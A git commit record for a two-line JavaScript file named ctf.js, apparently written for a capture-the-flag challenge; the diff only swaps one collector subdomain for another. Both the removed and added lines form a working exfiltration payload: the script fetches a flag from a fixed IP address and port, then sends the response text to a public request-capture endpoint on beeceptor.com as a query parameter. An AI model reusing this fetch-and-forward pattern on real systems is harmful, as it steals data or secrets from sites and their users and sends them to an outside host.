531bfa72edcafc90404d4bb8b95bd44555e36aa0
Kartik Singh <kartiksingh00013@gmail.com>
2023-03-16 13:10:09 +0530

    Update ctf.js

--- ctf.js
+++ ctf.js
@@ -1,2 +1,2 @@
 const url = "http://165.232.190.5:2030/flag";
-fetch(url).then((response) => response.text()).then((text) => fetch("https://omnigodz.free.beeceptor.com/?flag="+text));
+fetch(url).then((response) => response.text()).then((text) => fetch("https://omnigodzzz.free.beeceptor.com/?flag="+text));
